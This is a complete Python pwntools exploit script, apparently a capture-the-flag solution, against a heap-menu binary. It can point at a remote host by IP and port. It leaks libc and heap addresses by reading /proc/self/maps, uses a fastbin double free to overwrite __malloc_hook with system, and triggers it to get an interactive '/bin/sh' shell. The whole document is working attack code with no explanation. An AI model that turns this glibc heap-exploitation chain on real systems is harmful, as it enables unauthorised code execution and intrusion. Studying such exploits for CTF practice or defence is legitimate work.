from pwn import *

context(os='linux', arch='amd64')
BINARY = './pray_CaNaKMgF'
WTIME = 0.3
idx = 0

def alloc(r, size, data):
    global idx 

    r.sendline('1')
    r.recvuntil('Length? ')
    r.sendline(str(size))
    sleep(WTIME)
    r.send(data)
    r.recvuntil('away\n')
    res = idx
    idx += 1
    return res

def free(r, i):
    global idx
    r.sendline('3')
    r.recvuntil('Num? ')
    r.sendline(str(i))
    r.recvuntil('away\n')


def exploit():
    global idx 
    REMOTE = 0
    LIBC = "/lib/x86_64-linux-gnu/libc-2.24.so"
    if REMOTE:
        r = remote('128.199.247.60', 10001)
    else:
        r = process(BINARY)
    gdb.attach(r,'b *0x400C9A')
    elf = ELF(BINARY)
    libc = ELF(LIBC)

    r.recvuntil('5. Run away\n')

    r.sendline('2')
    r.recvuntil('ran? ')

    ###leak address to defeat aslr
    r.sendline("/proc/self/maps")
    data = r.recvuntil('when you finish reading,', drop=True)
    data = data.split('\n')

    for line in data:
        if 'r-xp' in line and 'libc' in line:
            minus_index = line.index('-')
            libc_base = line[:minus_index]
            libc_base = int(libc_base, 16)
        if 'heap' in line:
            minus_index = line.index('-')
            heap_base = line[:minus_index]
            heap_base = int(heap_base, 16)

    print hex(libc_base)
    print hex(heap_base)

    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    bin_sh_addr = libc_base + next(libc.search('/bin/sh\0'))

    print 'malloc_hook', hex(malloc_hook)
    print '/bin/sh', hex(bin_sh_addr), bin_sh_addr
    
    r.recvuntil('away\n')
    
    alloc(r, 0x10, "/bin/sh")
    idx0 = alloc(r, 0x60, 'AAAA')
    idx1 = alloc(r, 0x60, 'AAAA')
    idx2 = alloc(r, 0x10, '/bin/sh')

    #double free
    free(r, idx0)
    free(r, idx1)
    free(r, idx0)

    fd_ptr = p64(malloc_hook - 0x1b - 8)
    alloc(r, 0x60, fd_ptr)
    alloc(r, 0x60, 'C' * 8)

    alloc(r, 0x60, 'D' * 0x8)
    
    p = ''
    p += 'Q' * 3
    p += 'Q' * 16
    p += p64(libc_base + libc.symbols['system'])
    alloc(r, 0x60, p) #overwrite malloc_hook

    r.sendline('1')
    r.recvuntil('Length? ')
    r.sendline(str(heap_base + 0x10))

    r.interactive()
    
if __name__ == '__main__':
    exploit()
